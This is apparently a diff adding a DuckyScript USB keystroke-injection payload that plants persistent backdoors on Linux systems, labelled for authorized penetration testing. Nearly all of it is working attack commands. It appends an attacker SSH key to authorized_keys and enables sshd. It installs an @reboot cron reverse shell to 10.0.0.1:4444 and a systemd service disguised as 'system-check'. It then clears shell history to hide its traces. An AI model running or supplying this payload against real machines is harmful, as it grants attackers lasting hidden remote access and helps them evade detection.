@@ -1,0 +1,79 @@
+REM Title: Linux SSH Persistence
+REM Author: David Osisek (CamoZeroDay)
+REM Target: Ubuntu/Debian/RHEL
+REM Version: 1.0
+REM Category: Persistence
+REM
+REM ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ⚠️ CONFIGURE SSH PUBLIC KEY BEFORE USE
+REM Installs SSH backdoor with authorized_keys
+
+DELAY 1000
+
+REM Open Terminal
+CTRL-ALT t
+DELAY 1000
+
+REM Create .ssh directory
+STRING mkdir -p ~/.ssh
+ENTER
+STRING chmod 700 ~/.ssh
+ENTER
+DELAY 500
+
+REM Add SSH public key (REPLACE WITH YOUR PUBLIC KEY)
+STRING echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... your-key-here' >> ~/.ssh/authorized_keys
+ENTER
+DELAY 500
+
+REM Set permissions
+STRING chmod 600 ~/.ssh/authorized_keys
+ENTER
+DELAY 300
+
+REM Ensure SSH is enabled and started
+STRING sudo systemctl enable ssh
+ENTER
+DELAY 1000
+STRING sudo systemctl start ssh
+ENTER
+DELAY 1000
+
+REM Add cron backdoor (callback)
+STRING (crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"') | crontab -
+ENTER
+DELAY 500
+
+REM Create systemd service for persistence (optional)
+STRING echo '[Unit]' | sudo tee /etc/systemd/system/system-check.service
+ENTER
+STRING echo 'Description=System Check Service' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo '' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo '[Service]' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo 'ExecStart=/bin/bash -c "sleep 300 && /bin/bash -i"' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo 'Restart=always' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo '' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo '[Install]' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+STRING echo 'WantedBy=multi-user.target' | sudo tee -a /etc/systemd/system/system-check.service
+ENTER
+DELAY 1000
+
+REM Enable service
+STRING sudo systemctl enable system-check.service
+ENTER
+DELAY 1000
+
+REM Clear history
+STRING history -c
+ENTER
+
+REM Exit
+STRING exit
+ENTER
